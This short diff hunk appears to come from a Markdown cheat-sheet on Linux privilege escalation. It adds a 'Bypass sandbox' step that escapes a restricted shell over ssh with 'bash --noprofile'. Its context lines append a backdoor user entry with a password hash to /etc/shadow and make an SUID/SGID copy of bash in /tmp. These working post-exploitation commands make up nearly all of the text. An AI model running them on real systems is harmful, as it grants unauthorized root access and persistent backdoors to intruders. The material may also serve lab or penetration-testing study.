@@ -164,6 +164,11 @@ echo 'amxuser:$1$ozUCi1Me$rBG3vK5.jZUScy39PSVtM1:14798:0:99999:7:::' >>/etc/shad
 
 ## Exploit 
 
+Bypass sandbox:
+```
+ssh example@localhost -p 1234 -t "bash --noprofile"
+```
+
 Making SUIG SGID copy of bash:
 ```bash
 /bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom
